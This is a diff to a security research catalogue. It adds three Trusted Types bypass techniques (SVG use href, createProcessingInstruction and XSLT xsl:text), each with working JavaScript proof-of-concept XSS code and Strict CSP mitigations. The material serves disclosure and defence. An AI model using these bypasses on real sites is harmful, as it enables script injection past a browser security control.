@@ -93,3 +93,78 @@ import(attackerControlledString);
 
 ### Mitigations:
 - Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp) + serve allow-list of script endpoints in another `script-src` directive.
+
+## SVG `<use>` element
+
+[SVG `<use>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/use) element takes `href` attribute, which can import an external SVG image from given URL. This currently bypasses Trusted Types check. This was found by [Masato](https://twitter.com/kinugawamasato).
+
+
+[PoC](https://shhnjk.github.io/PoCs/cursed_types/svg_use.html):
+```
+let attackerControlledString = 
+    `data:image/svg+xml,
+     <svg id="x" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+       <image href="x" onerror="alert(origin)" />
+     </svg>#x`;
+const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
+use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', attackerControlledString);
+svg.appendChild(use);    
+document.body.appendChild(svg);
+```
+
+### Mitigations:
+- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
+- This is likely to be fixed in the future ([reference](https://github.com/w3c/webappsec-trusted-types/issues/357)).
+
+## document.createProcessingInstruction API
+
+[`document.createProcessingInstruction`](https://developer.mozilla.org/en-US/docs/Web/API/Document/createProcessingInstruction) can create [processing instruction](https://developer.mozilla.org/en-US/docs/Web/API/ProcessingInstruction) node from given URL and content type. This node can be inserted to XML document (but not HTML document). Currently there is no Trusted Types check on `document.createProcessingInstruction`. This was found by [Masato](https://twitter.com/kinugawamasato).
+
+[PoC](https://shhnjk.github.io/PoCs/cursed_types/createProcessingInstruction.xml):
+```
+/*
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+  <xsl:output method="html" />
+  <xsl:template match="/">
+    <script>alert(origin)</script>
+  </xsl:template>
+</xsl:stylesheet>
+*/
+let attackerControlledString = 'data:text/xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHhzbDpzdHlsZXNoZWV0IHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIiB2ZXJzaW9uPSIxLjAiPgogIDx4c2w6b3V0cHV0IG1ldGhvZD0iaHRtbCIgLz4KICA8eHNsOnRlbXBsYXRlIG1hdGNoPSIvIj4KICAgIDxzY3JpcHQ+YWxlcnQob3JpZ2luKTwvc2NyaXB0PgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg==';
+const pi = document.createProcessingInstruction('xml-stylesheet', `href='${attackerControlledString}' type='text/xml'`);
+document.insertBefore(pi, document.firstChild);
+```
+
+### Mitigations:
+- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
+
+## XSLT
+
+[XSLT](https://developer.mozilla.org/en-US/docs/Web/XSLT) supports [many elements](https://developer.mozilla.org/en-US/docs/Web/XSLT/Element). Trusted Types is not enforced on at least [`<xsl:text>`](https://developer.mozilla.org/en-US/docs/Web/XSLT/Element/text) element, but there are potentially more vectors. This was found by [Alex](https://twitter.com/insertScript).
+
+[PoC](https://shhnjk.github.io/PoCs/cursed_types/xslt.html):
+```
+let attackerControlledString = '<img src=x onerror=alert(origin)>';
+const doc = document.implementation.createHTMLDocument();
+const xslt = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:stylesheet');
+xslt.setAttribute('xmlns:xsl', 'http://www.w3.org/1999/XSL/Transform');
+const template = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:template');
+template.setAttribute('match', '/');
+const output = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:output');
+output.setAttribute('method', 'html');
+xslt.appendChild(output);
+const text = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:text');
+text.textContent = attackerControlledString;
+text.setAttribute('disable-output-escaping', 'yes');
+template.appendChild(text);
+xslt.appendChild(template);
+const processor = new XSLTProcessor();
+processor.importStylesheet(xslt);
+const fragment = processor.transformToFragment(doc, document);
+document.body.appendChild(fragment);
+```
+
+### Mitigations:
+- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
